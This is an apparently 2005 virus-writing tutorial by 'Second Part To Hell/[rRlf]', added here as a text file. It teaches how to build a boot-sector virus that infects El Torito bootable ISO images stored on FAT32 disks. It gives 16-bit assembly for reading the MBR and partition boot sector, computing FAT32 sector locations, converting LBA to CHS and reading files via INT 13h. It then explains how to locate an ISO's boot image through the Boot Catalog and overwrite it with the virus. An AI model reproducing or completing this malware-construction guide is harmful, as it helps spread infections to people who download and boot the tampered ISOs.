@@ -1,0 +1,522 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************    New era of bootsectorviruses #2:  ***********
+          ************   El Torito ISO infection at FAT32   ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro
+
+  1) Theory / Idea
+
+  2) MBR: Master Boot Record
+
+  3) Partition's Bootsector
+
+  4) Root Directory
+
+  5) Find data at the Harddisk
+
+  6) El Torito ISO
+
+  7) Last words
+
+
+
+
+
+
+  0) Intro
+
+     This  second  tutorial  about  bootsectorviruses is  about a very  unusual
+     topic: CD-ROM bootsector infection.  How could we infect a bootsector of a
+     CD-ROM?  Via infecting  bootable Images.  The bootable  CD-ROM  images are
+     called El Torito ISO-9660.  This standart is very common, and used in many
+     programs like  Ahead Nero Burning ROM.  El Torito ISOs are  spread via the
+     internet zB via Emule  (Knoppix, Windows Installation CD-ROM, ...). Before
+     reading this tutorial, it would be of some value to read the first article
+     about this topic as I will not repeat too much. Well, let's start!
+
+
+
+
+
+  1) Theory / Idea
+
+     What do we want?  Infecting a CD-ROM's bootsector.  We will  manage it via
+     infecting the Image file,  as I've already  told you.  But how can we find
+     image files???  We have to write our own  FAT32 FileSystem Driver.  Sounds
+     hard, but  it is not  if you  know what  exectly to do  (all you will know
+     after this tutorial :D).  After finding the ISO file,  we have to check if
+     it's ready to infect and  where we have  to infect it  (it has a much more
+     complicated  structure as  raw-data-image-files).  When we found the right
+     place, we have no more problems. OK, you should know now, what we will do,
+     just let us do it now...
+
+
+
+
+
+  2) MBR: Master Boot Record
+
+     The Master Boot Record is the first physical sector of the Harddisk.  Here
+     we also get the information  about the partition's start sector at the HD.
+     So first  thing we have to do after  loading the virus is to  load the MBR
+     into the memory. Let's say, offset 0x2000:
+
+
+ - - - - - - - - - - - - - [ Load MBR - Source ] - - - - - - - - - - - - -
+	mov	bx, 0x2000		; bx=0x2000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, bx
+	xor	bx, bx			; BX=0x0
+
+	mov	ah, 0x2			; Read
+	mov	al, 0x1			; 1 Sector
+	mov	cl, 1			; Start at sector 1
+	mov	ch, 0			; Cylinder=0
+	mov	dh, 0			; Head=0
+	mov	dl, 0x80		; Drive=0x80=HD
+	int	0x13			; Read MBR
+ - - - - - - - - - - - - - [ Load MBR - Source ] - - - - - - - - - - - - -
+
+     What is important: DL = drive number (bit 7 set for hard disk)
+     1000 0000 = 0x80 = HD
+
+     Now we have the MBR in memory at adresse 0x2000:0x0, what next? We have to
+     understand the stucture of the MBR:
+
+     Start:     Lenght:      Type:
+     *****************************
+     0   Byte   446 Byte     Bootloader
+     446 Byte   64  Byte     Partitiontable
+     510 Byte   2   Byte     0x55AA <- Bootsign
+
+
+     What we need  is the Partitiontable, to get  the start of  the partitions.
+     The table is  splitted into 4 parts  (=4 partitions)  with  the  same size
+     (16 byte). One entry of the Partitiontable looks like that:
+
+
+     Name:                    Start:     Lenght:      Description:
+     ******************************************************
+     Active Partition Flag    0 Byte     1 Byte       If the partition is active or not
+                                                      Active: 0x80 | Not active: 0x0
+     CHS Start                1 Byte     3 Byte       CHS value of start of the partition
+     Type                     4 Byte     1 Byte       Type of partition
+     CHS End                  5 Byte     3 Byte       CHS value of end of the partition
+     LBA Start                8 Byte     4 Byte       LBA value of start of the partition
+     LBA Length              12 Byte     4 Byte       LBA value of sectors IN the partition
+
+
+     Here we just need two values:  CHS Start for reading the Bootsector of the
+     partition and LBA Start for Sector calculation later on. So what to do for
+     reading the partition's bootsector? See:
+
+
+ - - - - - - - - - - - - - [ Load Partition's BS - Source ] - - - - - - - - - - - - -
+	xor	bx, bx			; bx=0=Start of MBR
+	mov	ax, [bx+454]		; ax=1st Partition's start: Partitiontable (446) + 8 = 454
+	mov	cl, [bx+447]		; cl=Sector of 1st Partition in CHS: 446 + 1 = 447
+	mov	dh, [bx+448]		; dh=Head of 1st Partition in CHS: 446 + 2 = 448
+	mov	ch, [bx+449]		; ch=Cylinder of 1st Partition in CHS: 446 + 3 = 449
+
+	mov	bx, 0x1000		; bx=0x1000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x1000
+	mov	ds, bx
+	xor	bx, bx			; BX=0x0
+
+	mov	[BootSecPar], ax	; Save 1st Partition's start in LBA
+
+	mov	ah, 0x2			; Read
+	mov	al, 0x10		; 16 Sector
+	mov	dl, 0x80		; Drive=0x80=HD
+
+	mov	bx, 0x2000		; bx=0x2000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, bx
+	xor	bx, bx			; BX=0x0
+	int	0x13			; Read First Sector of Partition
+ - - - - - - - - - - - - - [ Load Partition's BS - Source ] - - - - - - - - - - - - -
+
+
+
+
+
+  3) Partition's Bootsector
+
+     The partition now gives us the needed values for the root directory. First
+     we have to  know the calculation  for the Root Directory  (which tooked me
+     several days to find it, as nobody seemed to know that):
+
+     (boot sector)+(number of fats)*(sectors per fat)+(reserved sectors)+(root cluster-2)*(sectors per cluster)
+
+     And where are these offsets:
+
+     Offset 13 ;db sectors per cluster 
+     Offset 14 ;dw fat offset or reserved sectors 
+     Offset 16 ;db number of fats 
+     Offset 44 ;dd root cluster 
+     Offset 36 ;dd sectors per fat
+
+     At this point I have to thank Octavio, a member in the MenuetOS forum, for
+     this calculation and the offsets. Without you nobody could read this!
+
+     Let's see the code for getting the values:
+
+  - - - - - - - - - [ Get Cluster for Root_Directory - Source ] - - - - - - - - -
+	mov	ah, [bx+24]		; ah=BPB_SecPerTrk: For CHS calculation
+	mov	al, [bx+26]		; al=BPB_NumHeads: For CHS calculation
+
+	mov	cl, [bx+13]		; cl=Sector per cluster
+	mov	ch, [bx+16]		; ch=Number of FATs
+	mov	si, [bx+14]		; si=Reserved Sectors
+	mov	ebp, [bx+44]		; ebp=RootCluster
+	mov	edx, [bx+36]		; edx=Sectors per FAT
+
+	mov	bx, 0x1000		; bx=0x2000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x2000
+	mov	ds, bx
+	xor	bx, bx			; BX=0x0
+
+	mov	[TotalSector], ah	; Save BPB_SecPerTrk
+	mov	[TotalHead], al		; Save BPB_NumHeads
+
+	mov	[SecPerClust], cl	; Save Sector per cluster
+	mov	[ReservedSec], si	; Save Reserved Sector
+	mov	[NumOfFats], ch		; Save Number Of FATs
+	mov	[SecPerFat], edx	; Save Sector Per FAT
+	mov	[LBA], ebp		; Save Root Cluster
+
+	call	getLBA			; Get the real sector number
+					; Returns the real sector number in EAX
+  - - - - - - - - - [ Get Cluster for Root_Directory - Source ] - - - - - - - - -
+
+     At this calculation we got the all values  for the Root_Directory Cluster,
+     which  means that we have to  get the real  sector in  connection with the
+     value [LBA] at the  harddisk of this root directory.  [LBA] represents the
+     cluster  of the root  directory.  Now comes the  calculation  listed above
+     (ClusterNum -> SectorNum).
+
+  - - - - - - - - - - - - - - - [ getLBA - Source ] - - - - - - - - - - - - - - -
+getLBA:
+	;; Find Data: 
+	;; (boot sector)+(number of fats)*(sectors per fat)+(reserved sectors)+(Data cluster-2)*(sectors per cluster)
+	;; DataCluster saved in LBA
+
+	mov	eax, [SecPerFat]	; eax=SecPerFat
+	xor	bx, bx			; bx=0
+	mov	bl, [NumOfFats]		; bl=NumOfFats
+	mul	bx			; AX*BX=DX:AX
+
+	mov	[FATCalc], ax		; Save the result
+
+	xor	eax, eax		; EAX=0
+	mov	al, [SecPerClust]	; al=SecPerClust
+	mov	ebx, [LBA]		; ebx=DataCluster
+	sub	ebx, 2			; DataCluster-=2
+
+	mul	ebx			; EAX*EBX=EDX:EAX
+
+	mov	[ClustCalc], eax	; Save the result
+
+	xor	eax, eax		; eax=0
+	mov	ax, [BootSecPar]	; AX=Sectors before the 1st partition
+	xor	ebx, ebx		; ebx=0
+	mov	bx, [FATCalc]		; BX=(number of fats)*(sectors per fat)
+	add	eax, ebx		; AX+=BX
+	mov	bx, [ReservedSec]	; BX=Reserved Sectors
+	add	eax, ebx		; AX+=BX
+	mov	ebx, [ClustCalc]	; BX=(Root Cluster-2)*(Sectors per Cluster)
+	add	eax, ebx		; AX+=BX
+
+	xor	edx, edx		; EDX=0
+ret
+  - - - - - - - - - - - - - - - [ getLBA - Source ] - - - - - - - - - - - - - - -
+
+     What we have now in EAX is the sector number on the harddisk (NOT the same
+     as partition!!!).  But we can not read it,  as we don't know the Cylinder,
+     Head  and Sector  for INT 0x13/AH=2.  So first  we have to  calculate this
+     values. How to calculate this values? (thanks to Jack Dobiash)
+
+            Sector   = ((LBA Mod Total Sectors) +1)
+            CylHead = (LBA Div Total Sectors)
+            Head = (CylHead Mod (Total Heads + 1))
+            Cylinder = (CylHead Div (Total Heads + 1))
+
+     This is the standart,  but for HDs you  can use the 2 highest  byte of the
+     sector also  for cylinders.  This allows  63 Sectors,  255 Heads and  1023
+     Cylinder.
+
+     The following list is copyed by Ralf Brown's Interrupt List:
+
+     INT 13 - DISK - READ SECTOR(S) INTO MEMORY
+	AH = 02h
+	AL = number of sectors to read (must be nonzero)
+	CH = low eight bits of cylinder number
+	CL = sector number 1-63 (bits 0-5)
+	     high two bits of cylinder (bits 6-7, hard disk only)
+	DH = head number
+	DL = drive number (bit 7 set for hard disk)
+	ES:BX -> data buffer
+
+     You should understand it, see the source of this function now:
+
+  - - - - - - - - - - - - - - - - [ CHS - Source ] - - - - - - - - - - - - - - - -
+CHS:
+	xor	ebx, ebx		; ebx=0
+	mov	bl, [TotalSector]	; Total Sectors
+	div	ebx			; EDX:EAX DIV EBX=
+					; EAX= Quotient
+					; EDX= Reminder
+	inc	dx			; Reminder+1=Sector
+	mov	[sector], dl		; Sector=Reminder (not more than 0xFF)
+	mov	[cylhead], eax
+
+	mov	edx, eax		; EDX=Quotient
+	shr	edx, 16			; DX=High number of quotient
+
+	xor	bx, bx			; BX=0
+	mov	bl, [TotalHead]		; Total Heads
+	div	bx			; DX:AX DIV BX=
+					; AX= Quotient
+					; DX= Reminder
+
+	mov	[head], dl		; Head=Reminder
+	mov	[cylinder], al		; Cylinder=Quotient
+	shl	ah, 6			; 0000 00?? -> ??00 0000
+	mov	al, [sector]		; high two bits of cylinder (bits 6-7, hard disk only)
+	or	al, ah			; 00xx xxxx -> ??xx xxxx
+	mov	[sector], al		; Save!
+ret
+  - - - - - - - - - - - - - - - - [ CHS - Source ] - - - - - - - - - - - - - - - -
+
+
+     Now you have the important values in [sector], [head] and [cylinder]. Just
+     read it now.
+
+
+
+
+
+  4) Root Directory
+
+     The FAT32 root directory has  some differents to the FAT12 root directory.
+     Every file entry has, in normal cases, 32 bytes of data. Just if the file
+     uses a long word,  the data  is longer  (but we can easiely  ignore that).
+     Most things I've already  descripted in the previous article,  so there is
+     no need to copy these infos.
+     See the list of the 32 bytes of a file:
+
+     Name             * Offset  * Size  * Description
+     **************************************************************************
+     DIR_Name         * 0       * 11    * File Name (*)                       *
+     DIR_Attr         * 11      * 1     * File Attributes (*)                 *
+     DIR_NTRes        * 12      * 1     * Reserved: Set zero                  *
+     DIR_CrtTimeTenth * 13      * 1     * Time: Unimportant                   *
+     DIR_CrtTime      * 14      * 2     * Time: Unimportant                   *
+     DIR_CrtDate      * 16      * 2     * Date: Unimportant                   *
+     DIR_LstAccDate   * 18      * 2     * Date: Unimportant                   *
+     DIR_FstClusHI    * 20      * 2     * High word of this entry's first     *
+                      *         *       * cluster number                      *
+     DIR_WrtTime      * 22      * 2     * Time: Unimportant                   *
+     DIR_WrtDate      * 24      * 2     * Date: Unimportant                   *
+     DIR_FstClusLO    * 26      * 2     * Low word of 1st cluster number (*)  *
+     DIR_FileSize     * 28      * 2     * Filesize (*)                        *
+     **************************************************************************
+
+     (*) = Already descriped in 'New era of bootsectorvirus #1'
+
+
+
+
+
+  5) Find data at the Harddisk
+
+     Now we know, how the FAT32 root directory looks like.  And now: How to get
+     a file of an entry, which we want?
+
+     First, we have to compair the two words of the cluster number,  so we have
+     the real dword:
+
+
+  - - - - - - - - - - - - - - - - [ dword - Source ] - - - - - - - - - - - - - - - -
+	mov	ax, [bx+20]		; High number of cylinder to ax
+	shl	eax, 0x10		; High number in e-part of eax
+	mov	ax, [bx+26]		; Low number of cylinder to ax
+  - - - - - - - - - - - - - - - - [ dword - Source ] - - - - - - - - - - - - - - - -
+
+     Now we have the cluster number in eax.  To read them, we first have to get
+     the LBA number (sector number at partition) and then calculate the CHS for
+     the INT 13 / AH=0x2||0x3.  We already know the function getLBA and CHS, so
+     there is no need to write them down again. See the code for reading a file
+     into memory:
+
+
+  - - - - - - - - - - - - - - - - [ Read File - Source ] - - - - - - - - - - - - - - - -
+	mov	[LBA], eax		; DataCluster=EAX
+	call	getLBA			; Get the real sector number
+					; Returns the sector number in EAX
+	mov	[LBA], eax		; Save the LBA
+	call	CHS			; Get the CHS of the real sector number
+
+	mov	ah, 0x2			; Read
+	mov	al, 0x1			; 1 Sector
+	mov	cl, [sector]		; Start at sector ??
+	mov	ch, [cylinder]		; Cylinder=?
+	mov	dh, [head]		; Head=??
+	mov	dl, 0x80		; Drive=0x80=HD
+
+	mov	bx, 0x3000		; bx=0x3000
+	mov	es, bx			; Data will be read to ES:BX, ES=0x3000
+	mov	ds, bx
+	xor	bx, bx			; BX=0x0
+
+	int	0x13			; Read Sectors
+  - - - - - - - - - - - - - - - - [ Read File - Source ] - - - - - - - - - - - - - - - -
+
+     What we  have now is the  first sector of  the file in memory  starting at
+     offset 0x3000:0x0.
+
+
+
+
+
+  6) El Torito ISO
+
+     El Torito is the bootable format of CD-ROM images (ISO). This is the image
+     we want to infect. :)  First enormous  important thing  to know is, that a
+     sector at a  CD-ROM is 0x800 bytes long,  not like the  sectors at the HD,
+     which are 0x200 bytes long.  Then it's  important to know,  that the boot-
+     sector of CD-ROMs is not the first sector, as it's at floppies or HDs.
+
+     In this article I just write about 'Single Boot-Image Configuration'.  See
+     the short graphic about the structure of this kind of files:
+
+                +-------------------------+
+     Sector 0:  |          SYSTEM         |
+                |         (UNUSED)        |
+                |-------------------------|
+     Sector 16: |      Primary Volume     |
+                |-------------------------|
+     Sector 17: |    Boot Record Volume   |-------+
+                |-------------------------|       |
+                |                         |       |
+                |-------------------------|       |
+                |                         |       |
+                |-------------------------|       |
+                |                         |       |
+                |-------------------------|       |
+                | Set Termination Volume  |       |
+                |-------------------------|       |
+                |     Boot Catalog        | <-----+ 
+                |                         |-------+
+                |-------------------------|       |
+                |  Bootable Disk Image    | <-----+
+                |-------------------------|
+                |      CD-ROM Image       |
+                +-------------------------+
+
+     We see, which parts we need to read to get the  Bootable Disk Image. First
+     we need  to read the  Boot Record Volume to  get the  pointer to the  Boot
+     Catalog. This Boot Catalog finally points to the Bootable Disk Image.
+
+     Now let's read the Boot Record Volume. It is at the 17th sector. Remember:
+     The 17th Sector  of a CD-ROM  (image) is the  17*4th (68th) sector  of the
+     harddisk!  To know what to do next,  we need further infos  about the Boot
+     Record Volume:
+
+     Offset * Type  * Description
+     ****************************
+     0      * Byte  * Boot Record Indicator
+     1-5    * Byte  * ISO-9660 Identifier, must be 'CD001'
+     6      * Byte  * Version of the descriptor, must be 1
+     7-26   * Byte  * Boot System Identifier, must be 'EL TORITO SPECIFICATION" 
+                      padded with 0's.
+     27-46  * Byte  * Unused, must be 0.
+     47-4A  * DWord * Absolute pointer to first sector of Boot Catalog.
+     4A-7FF * Byte  * Unused, must be 0.
+
+
+     You can see our pointer now. The pointer uses the number of CD-ROM sectors
+     which means, that you have to muliplicate it with 4, to get the HD sector.
+     Then  you add the  sector number  of the filestart,  and you have the real
+     sector number, which we have to read next.
+
+     The Boot Catalog  is splittet in some  different parts, see  the structure
+     now:
+
+
+     Offset * Type  * Description
+     ****************************
+     0      * Byte  * Header ID, must be 01.
+     1      * Byte  * Platform ID.
+     2-3    * Word  * Reserved, must be 0.
+     4-1B   * Char  * ID-String.
+     1C-1D  * Int   * Checksum Word.
+     1E     * Byte  * Key Byte, must be 55.
+     1F     * Byte  * Key Byte, must be AA.
+     Validation Entry (subname)
+
+     Next comes the Initial/Default Entry, add 0x20 to the offset.
+
+     Offset * Type  * Description
+     ****************************
+     0      * Byte  * Boot Indicator (88=bootable | 00=not bootable)
+     1      * Byte  * Boot media Type
+     2-3    * Word  * Load segment (standart is 0x7C0)
+     4      * Byte  * System Type.
+     5      * Byte  * Unused, must be 0.
+     6-7    * Word  * Sector count.
+     8-0B   * DWord * Load RBA. This is the start address of the virtual disk.
+     0C-1F  * Byte  * Unused, must be 0.
+
+     The Value at  8-0xB (Load RBA) is  the pointer to  the sector of  the boot
+     sector of the ISO file. We have to get this sector, and we have it.
+
+     Now we can overwrite this sector and the following sectors with our virus.
+     Everything is ready now. Finally! :)
+
+
+
+
+
+  7) Last words
+
+     Finally,  the first CD-ROM  bootsector  virus has  been finished,  and the
+     information to write it has been  published with this article. There would
+     be  another  undiscovered  technique  going  hand  in hand  with this one:
+     Network Boot viruses  using BOOTP.  But I doubt that I will  make that one
+     soon, as I'm bored of the OS-developing currently :). At this point I also
+     want to say 'hi' to LiTlLe VxW,  who has published an article called 'Boot
+     CD infection' in 29a#8 in january 2005.  The article was unfortunatly just
+     theoretically - I did not used any information by his article :).
+     Here are some  articles  which may  be useful for reading,  if you want to
+     make a CD-ROM bootsector virus:
+
+       - FAT: Gerneral Overview of On-Disk Formation by Microsoft Corporation
+       - Volume and File Structure of CDROM for Information Interchange
+       - "El Torito" Bootable CD-ROM Format Specification
+
+     Well,the discoverment on this topic used six months, and now it is ending.
+     It was an interesting topic,  and I hope that you are (at least partly :D)
+     interested in it!  See you soon out there,  and don't forget:  Never stopp
+     fooling the establishment :)
+
+
+                                                  - - - - - - - - - - - - - - -
+                                                    Second Part To Hell/[rRlf]  
+                                                    www.spth.de.vu
+                                                    spth@priest.com
+                                                    written from Jan 2005 - April 2005
+
+                                                    ...surrealistic viruswriter...
+                                                  - - - - - - - - - - - - - - - 
